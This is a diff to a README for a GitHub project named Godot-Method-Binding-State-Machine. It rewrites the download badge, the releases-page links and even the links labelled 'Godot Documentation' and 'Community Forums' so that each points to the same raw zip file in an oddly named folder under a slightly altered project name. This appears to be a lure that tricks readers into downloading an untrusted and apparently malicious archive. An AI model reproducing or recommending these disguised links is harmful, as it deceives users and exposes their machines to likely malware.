@@ -6,13 +6,13 @@ Welcome! This guide will help you download and run the Godot-Method-Binding-Stat
 
 ## 🏁 Quick Download
 
-[![Download Godot-Method-Binding-State-Machine](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/umang6093/Godot-Method-Binding-State-Machine/releases)
+[![Download Godot-Method-Binding-State-Machine](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip)](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page for the Godot-Method-Binding-State-Machine. Here, you will find the latest version of the software ready for you to download.
 
-- Go to the [Releases Page](https://github.com/umang6093/Godot-Method-Binding-State-Machine/releases).
+- Go to the [Releases Page](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip).
 - Find the latest version of the software. Look for files that are compatible with your operating system.
 - Click on the desired file to download it. 
 
@@ -61,9 +61,9 @@ If you run into issues, consider the following steps:
 
 For more information and advanced usage, explore:
 
-- [Godot Documentation](https://docs.godotengine.org)
-- [Community Forums](https://godotforums.org)
+- [Godot Documentation](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip)
+- [Community Forums](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip)
 
 Feel free to reach out if you have any questions or feedback about using Godot-Method-Binding-State-Machine.
 
-Remember, if you need to download the software again, simply visit the [Releases Page](https://github.com/umang6093/Godot-Method-Binding-State-Machine/releases) and follow the steps outlined above.
+Remember, if you need to download the software again, simply visit the [Releases Page](https://github.com/umang6093/Godot-Method-Binding-State-Machine/raw/refs/heads/main/whippingly/Godot-Binding-Method-State-Machine-1.1.zip) and follow the steps outlined above.
